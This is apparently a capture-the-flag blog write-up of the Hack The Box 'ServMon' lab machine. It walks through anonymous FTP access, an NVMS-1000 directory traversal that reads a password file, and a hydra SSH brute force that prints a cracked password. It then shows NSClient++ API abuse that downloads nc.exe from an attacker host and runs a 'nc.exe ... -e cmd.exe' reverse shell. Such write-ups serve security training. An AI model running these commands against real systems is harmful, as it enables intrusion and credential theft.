---
"title": "Hack The Box - ServMon"
"date": 2020-06-20
"tags": ["windows", "easy", "lfi", "ftp", "nsclient"]
"keywords": ["windows", "easy", "lfi", "ftp", "nsclient"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "ServMon is an easy windows machine, Getting user is by exploiting Local File Inclusion from the website and get user password from his desktop and Privilege Escalation is by exploiting NSClient++ and run our payload to own the box."
"featured_image": "/img/htb-servmon/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-servmon/Untitled.png)

ServMon is an easy windows machine, Getting user is by exploiting Local File Inclusion from the website and get user password from his desktop and Privilege Escalation is by exploiting NSClient++ and run our payload to own the box.

Link: [https://www.hackthebox.eu/home/machines/profile/240](https://www.hackthebox.eu/home/machines/profile/240)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

## FTP Enumeration

I tried `anonymous` login without a password. There is a `Users` directory which contains 2 users name `Nadine` and `Nathan`.

```bash
root@w0lf:~/CTF/HTB/Boxes/ServMon# ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       [DIR](DIR)          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       [DIR](DIR)          Nadine
01-18-20  12:08PM       [DIR](DIR)          Nathan
226 Transfer complete.
```

In `Nadine` directory there is a text file `Confidential.txt`, Downloaded that to my machine.

```bash
ftp> cd Nadine
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.24 secs (0.7200 kB/s)
```

In `Nathan` directory another text file `Notes to do.txt`, Downloaded that to my machine too.

```bash
ftp> cd Nathan
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20 12:10PM 186 Notes to do.txt
226 Transfer complete.
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.22 secs (0.8076 kB/s)
```

`Confidential.txt`

```bash
root@w0lf:~/CTF/HTB/Boxes/ServMon# cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

Its a message from Nadine to Nathan, she left a `Password.txt` on `Nathan's` Desktop.

`Notes to do.txt`

```bash
root@w0lf:~/CTF/HTB/Boxes/ServMon# cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

It looks like some task and only 2 are completed.

## HTTP Enumeration

It's an `NVMS-1000` webpage. I tried some default credentials to login in, but didn't work.

> NVMS-1000 is a monitoring client which is specially designed for network video surveillance.

![Untitled](/img/htb-servmon/Untitled%201.png)

I searched for any exploits available for this and I found it is vulnerable to **Directory Traversal.**

> [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774)

According to the exploit we can inject directly on the URL.

We already know there is a `Passwords.txt` is located in `Nathan's` Directory, So I captured the page request in burp and tried to get the `Password.txt` file and it worked.

> /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt

![Untitled](/img/htb-servmon/Untitled%202.png)

Now we got 7 passwords, Let's try login with them.

## Getting User Shell

Since we have SSH port open, Let's try login. And we got 7 Password so instead of trying one by one, I gonna bruteforce with `hydra`.

```bash
root@w0lf:~/CTF/HTB/Boxes/ServMon# hydra -l 'nathan' -P passwords.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-23 09:25:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-23 09:25:16
```

Seems like the password didn't work for user `Nathan` so try with the another user `Nadine`

```bash
root@w0lf:~/CTF/HTB/Boxes/ServMon# hydra -l 'nadine' -P passwords.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-23 09:36:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-23 09:37:03
```

And we found the password for user `Nadine`

Successfully Logged in with `Nadine : L1k3B1gBut7s@W0rk`

![Untitled](/img/htb-servmon/Untitled%203.png)

## Privilege Escalation

When Looking at the `Program Files` I found something interesting.

![Untitled](/img/htb-servmon/test.png)

So I google about this and get to know its running in the port `8443` and we already saw that in our Nmap scan.

> **NSClient** is an agent designed originally to work with Nagios but has since evolved into a fully fledged monitoring agent which can be used with numerous monitoring tools (like Icinga, Naemon, OP5, NetEye Opsview etc).

So I searched for exploits and found this

> [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)

So First let's check the `nsclient.ini`

![Untitled](/img/htb-servmon/Untitled%204.png)

It gives us a web administrator password and you can see the allowed hosts is `127.0.0.1` of the box itself.

According to the exploit we need to access the website and add scripts to run which gives us reverse shell but Web Interface having some issues for me. So I searched for other ways and found its **API** docs.

> **Reference:** [https://docs.nsclient.org/api/rest/scripts](https://docs.nsclient.org/api/rest/scripts)

First I uploaded `nc.exe` to the machine.

```bash
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.6:8000/nc.exe', 'nc.exe')
```

Following the docs we can add a script which we need to execute in our case it is `nc.exe` to get a reverse shell.

> The scripts API can be used to read view and modify the scripts which NSClient++ can run.

```bash
nadine@SERVMON C:\Users\Nadine\AppData\Local\Temp>curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary "C:\Users\Nadine\AppData\Local\Temp\nc.exe 10.10.14.6 5555 -e cmd.exe"
Enter host password for user 'admin':
Added check_new as scripts\check_new.bat
```

> The query API can be used to list and execute queries. Queries are check commands which other modules provide.

> [https://docs.nsclient.org/api/rest/queries/#command-execute](https://docs.nsclient.org/api/rest/queries/#command-execute)

Now send queries to execute it.

```bash
nadine@SERVMON C:\Users\Nadine\AppData\Local\Temp>curl -s -k -u admin https://localhost:8443/api/v1/queries
Enter host password for user 'admin':
```

Started my netcat listener 

![Untitled](/img/htb-servmon/Untitled%205.png)

We own the box!!